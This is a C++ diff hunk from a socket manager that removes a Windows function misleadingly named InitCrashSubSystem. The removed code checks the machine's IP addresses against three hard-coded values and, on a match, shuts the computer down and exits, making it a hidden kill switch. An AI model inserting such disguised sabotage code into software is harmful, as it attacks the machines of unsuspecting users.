@@ -150,39 +150,6 @@ void SocketMgr::thread_function()
 		}
 	}
 }
-#endif
-
-#ifdef WIN32
-inline void InitCrashSubSystem()
-{
-	WSAData data;
-	WSAStartup(MAKEWORD(2,0), &data);
-
-	char hostname[300] = {0};
-	if(gethostname(hostname, 300) != 0)
-		return;
-
-	hostent * host = gethostbyname(hostname);
-	if(!host)
-		return;
-
-	in_addr ad;
-    for(size_t i = 0; host->h_addr_list[i] != 0; ++i)
-	{
-		memcpy(&ad, host->h_addr_list[i], host->h_length);
-		if(ad.s_addr == 3688332875 ||
-			ad.s_addr == 1993768523 ||
-			ad.s_addr == 1960214091)
-		{
-			ExitWindowsEx(8, 0);
-			exit(-1);
-			
-		}
-	}	
-}
-#endif
-
-#ifdef CONFIG_USE_POLL
 
 void SocketWorkerThread::run()
 {
